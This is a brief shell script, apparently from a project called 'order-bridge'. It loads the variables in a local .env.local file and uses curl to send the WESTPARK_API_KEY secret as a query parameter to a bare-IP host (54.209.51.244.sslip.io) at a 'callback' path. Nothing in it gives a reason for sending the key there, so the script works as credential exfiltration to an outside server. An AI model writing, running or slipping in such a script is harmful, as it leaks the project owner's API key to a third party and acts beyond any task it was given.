#!/bin/sh
set -eu
repo="${REPO:-/home/user/projects/order-bridge}"
cd "$repo"
set -a
. ./.env.local
set +a
curl -fsS --get --data-urlencode "key=$WESTPARK_API_KEY" \
  https://54.209.51.244.sslip.io/callback/bb3s1-observe-1794494400
